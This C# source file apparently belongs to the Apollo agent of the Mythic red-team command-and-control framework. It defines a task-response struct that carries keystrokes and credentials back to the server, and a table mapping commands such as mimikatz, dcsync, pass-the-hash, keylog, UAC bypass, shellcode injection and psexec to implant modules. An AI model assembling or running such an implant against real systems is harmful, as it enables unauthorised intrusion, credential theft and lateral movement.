#define COMMAND_NAME_UPPER

#if DEBUG
#undef BYPASSUAC
#define BYPASSUAC
#undef CAT
#define CAT
#undef CD
#define CD
#undef PWD
#define PWD
#undef CP
#define CP
#undef DCSYNC
#define DCSYNC
#undef DOWNLOAD
#define DOWNLOAD
#undef GETPRIVS
#define GETPRIVS
#undef ASSEMBLY_INJECT
#define ASSEMBLY_INJECT
#undef EXECUTE_ASSEMBLY
#define EXECUTE_ASSEMBLY
#undef KEYLOG
#define KEYLOG
#undef LIST_ASSEMBLIES
#define LIST_ASSEMBLIES
#undef REGISTER_ASSEMBLY
#define REGISTER_ASSEMBLY
#undef EXIT
#define EXIT
#undef INJECT
#define INJECT
#undef JOBS
#define JOBS
#undef JOBKILL
#define JOBKILL
#undef KILL
#define KILL
#undef LS
#define LS
#undef MAKE_TOKEN
#define MAKE_TOKEN
#undef MIMIKATZ
#define MIMIKATZ
#undef MKDIR
#define MKDIR
#undef MV
#define MV
#undef NET_DCLIST
#define NET_DCLIST
#undef NET_LOCALGROUP
#define NET_LOCALGROUP
#undef NET_LOCALGROUP_MEMBER
#define NET_LOCALGROUP_MEMBER
#undef NET_SHARES
#define NET_SHARES
#undef PIVOT
#define PIVOT
#undef PIVOT_WMI_PROCESS_CREATE
#define PIVOT_WMI_PROCESS_CREATE
#undef PRINTSPOOFER
#define PRINTSPOOFER
#undef PSEXEC
#define PSEXEC
#undef LINK
#define LINK
#undef UNLINK
#undef UNLOAD_ASSEMBLY
#define UNLOAD_ASSEMBLY
#define UNLINK
#undef PS
#define PS
#undef PS_FULL
#define PS_FULL
#undef POWERPICK
#define POWERPICK
#undef POWERSHELL
#define POWERSHELL
#undef PSIMPORT
#define PSIMPORT
#undef PSINJECT
#define PSINJECT
#undef PSCLEAR
#define PSCLEAR
#undef PTH
#define PTH
#undef LIST_SCRIPTS
#define LIST_SCRIPTS
#undef REG_QUERY_SUBKEYS
#undef REG_QUERY_VALUES
#undef REG_WRITE_VALUE
#define REG_QUERY_SUBKEYS
#define REG_QUERY_VALUES
#define REG_WRITE_VALUE
#undef REV2SELF
#define REV2SELF
#undef RM
#define RM
#undef RMDIR
#define RMDIR
#undef RUN
#define RUN
#undef SCREENSHOT
#define SCREENSHOT
#undef SHELL
#define SHELL
#undef SHINJECT
#define SHINJECT
#undef SLEEP
#define SLEEP
#undef SOCKS
#define SOCKS
#undef SPAWN
#define SPAWN
#undef STEAL_TOKEN
#define STEAL_TOKEN
#undef UPLOAD
#define UPLOAD
#undef SPAWNTO_X64
#define SPAWNTO_X64
#undef SPAWNTO_X86
#define SPAWNTO_X86
#undef WHOAMI
#define WHOAMI
#undef SET_INJECTION_TECHNIQUE
#define SET_INJECTION_TECHNIQUE
#undef GET_CURRENT_INJECTION_TECHNIQUE
#define GET_CURRENT_INJECTION_TECHNIQUE
#undef LIST_INJECTION_TECHNIQUES
#define LIST_INJECTION_TECHNIQUES

#endif
using System.Collections.Generic;
using Newtonsoft.Json;
using System;
using Mythic.Structs;
using System.Security.Policy;

namespace Apollo
{
    namespace Tasks
    {
        /// <summary>
        /// Struct for formatting task output or other information to send back
        /// to Apfell server
        /// </summary>
        public struct ApolloTaskResponse
        {
            public object user_output;
            public bool completed;
            public string user;
            public string window_title;
            public string keystrokes;
            public string task_id;
            public string status;
            public Mythic.Structs.EdgeNode[] edges;
            public object file_browser;
            public string full_path;
            public string host;
            public long total_chunks;
            public string message_id;
            public int chunk_num;
            public string chunk_data;
            public string file_id;
            public MythicCredential[] credentials;
            public RemovedFileInformation[] removed_files;
            public Artifact[] artifacts;

            public ApolloTaskResponse(Task t, object userOutput = null, Mythic.Structs.EdgeNode[] nodes = null)
            {
                task_id = t.id;
                completed = t.completed;
                user_output = userOutput;
                file_browser = null;
                full_path = null;
                total_chunks = -1;
                message_id = null;
                chunk_num = 0;
                chunk_data = null;
                file_id = null;
                user = null;
                window_title = null;
                keystrokes = null;
                credentials = null;
                removed_files = null;
                artifacts = null;
                host = null;

                if (userOutput != null && userOutput.GetType() != typeof(string))
                {
                    user_output = JsonConvert.SerializeObject(userOutput);
                    if (userOutput.GetType() == typeof(Mythic.Structs.FileBrowserResponse))
                        file_browser = userOutput;
                }
                edges = nodes;
                if (nodes == null)
                    edges = new Mythic.Structs.EdgeNode[] { };
                status = t.status;
            }
        }

        /// <summary>
        /// A task to assign to an implant
        /// </summary>
        [Serializable]
        public class Task
        {
            public bool completed { get; set; } = false;

            /// <summary>
            /// The command passed by Apfell, such as "mv".
            /// </summary>
            public string command { get; set; }
            /// <summary>
            /// The parameters passed with the task given by
            /// Apfell. e.g., given "mv" command, @params
            /// could be "file1 file2"
            /// </summary>
            public string parameters { get; set; }
            /// <summary>
            /// ID of the task.
            /// </summary>
            public string id { get; set; }
            public string status { get; set; }
            public object message { get; set; }

            //public long timestamp { get; set; }

            /// <summary>
            /// TaskMap is responsible for tracking what modules
            /// are loaded into the agent at any one time.
            /// </summary>
            public static Dictionary<string, string> TaskMap = new Dictionary<string, string>()
            {
#if BYPASSUAC
                { "bypassuac", "BypassUac" },
#endif
                #if CAT

                { "cat", "Cat" },
                #endif
                #if CD

                { "cd", "ChangeDir" },
                #endif
                #if PWD

                { "pwd", "PrintWorkingDirectory" },
                #endif
                #if CP
                { "cp", "CopyFile" },
                #endif
                #if DOWNLOAD

                { "download", "Download" },
#endif
#if MV
                { "mv", "MoveFile" },
#endif
#if NET_SHARES
                { "net_shares", "NetShares" },
#endif
#if GETPRIVS

                { "getprivs", "TokenManager" },
                #endif
                #if ASSEMBLY_INJECT

                { "assembly_inject", "AssemblyManager" },
                #endif
                #if EXECUTE_ASSEMBLY

                { "execute_assembly", "AssemblyManager" },
                #endif
                #if LIST_ASSEMBLIES

                { "list_assemblies", "AssemblyManager" },
                #endif
                #if REGISTER_ASSEMBLY

                { "register_assembly", "AssemblyManager" },
#endif
#if UNLOAD_ASSEMBLY
                { "unload_assembly", "AssemblyManager" },
#endif
#if EXIT

                { "exit", "Exit" },
#endif
#if INJECT
                { "inject", "Inject"},
#endif
#if JOBS

                { "jobs", "Jobs" },
#endif
#if JOBKILL

                { "jobkill", "Jobs" },
#endif
#if KEYLOG
                { "keylog", "Keylog" },
#endif
#if KILL

                { "kill", "Kill" },
#endif
#if LS

                { "ls", "DirectoryList" },
#endif
#if MAKE_TOKEN

                { "make_token", "TokenManager" },
#endif
#if MIMIKATZ

                { "mimikatz", "Mimikatz" },
#endif
#if MKDIR

                { "mkdir", "MakeDirectory" },
#endif
#if NET_DCLIST
                { "net_dclist", "NetDCList" },
#endif
#if NET_LOCALGROUP_MEMBER
                { "net_localgroup_member", "NetLocalGroupMember" },
#endif
#if NET_LOCALGROUP
                { "net_localgroup", "NetLocalGroup" },
#endif
#if PIVOT

                { "pivot", "PivotManager" },
#endif
#if PIVOT_WMI_PROCESS_CREATE

                { "pivot_wmi_process_create", "LateralMovement.WMIProcessExecute" },
#endif
#if PTH
                { "pth", "MimikatzWrappers" },
#endif
#if DCSYNC
                { "dcsync", "MimikatzWrappers" },
#endif
#if LINK

                { "link", "LinkManager" },
#endif
#if UNLINK

                { "unlink", "LinkManager" },
#endif
#if PS

                { "ps", "ProcessList" },
#endif
#if PS_FULL

                { "ps_full", "ProcessList" },
#endif
#if POWERPICK

                { "powerpick", "PowerShellManager" },
#endif
#if POWERSHELL

                { "powershell", "PowerShellManager" },
#endif
#if PRINTSPOOFER
                { "printspoofer", "PrintSpoofer" },
#endif
#if PSIMPORT

                { "psimport", "PowerShellManager" },
#endif
#if PSINJECT

                { "psinject", "PowerShellManager" },
#endif
#if PSCLEAR

                { "psclear", "PowerShellManager" },
#endif
#if LIST_SCRIPTS

                { "list_scripts", "PowerShellManager" },
#endif
#if REV2SELF

                { "rev2self", "TokenManager" },
#endif
#if RM

                { "rm", "Remove" },
#endif
#if RMDIR

                { "rmdir", "Remove" },
#endif
#if RUN

                { "run", "Process" },
#endif
#if SCREENSHOT

                { "screenshot", "Screenshot" },
#endif
#if SHELL

                { "shell", "Process" },
#endif
#if SHINJECT

                { "shinject", "Shellcode" },
#endif
#if SLEEP

                { "sleep", "Sleep" },
#endif
#if STEAL_TOKEN

                { "steal_token", "TokenManager" },
#endif
#if UPLOAD

                { "upload", "Upload" },
#endif
#if SOCKS
                { "socks", "Socks" },
#endif
#if SPAWN
                { "spawn", "Spawn" },
#endif
#if SPAWNTO_X64

                { "spawnto_x64", "SpawnTo" },
#endif
#if SPAWNTO_X86

                { "spawnto_x86", "SpawnTo" },
#endif
#if WHOAMI

                { "whoami", "TokenManager" },
#endif
#if SET_INJECTION_TECHNIQUE

                { "set_injection_technique", "InjectionManager" },
#endif
#if GET_CURRENT_INJECTION_TECHNIQUE

                { "get_current_injection_technique", "InjectionManager" },
#endif
#if REG_QUERY_SUBKEYS
                { "reg_query_subkeys", "RegistryManager" },
#endif
#if REG_QUERY_VALUES
                { "reg_query_values", "RegistryManager" },
#endif
#if REG_WRITE_VALUE
                { "reg_write_value", "RegistryManager" },
#endif
#if LIST_INJECTION_TECHNIQUES

                { "list_injection_techniques", "InjectionManager" },
#endif
#if PSEXEC
                { "psexec", "LateralMovement.PSExec" },
#endif

            };
        }
    }
}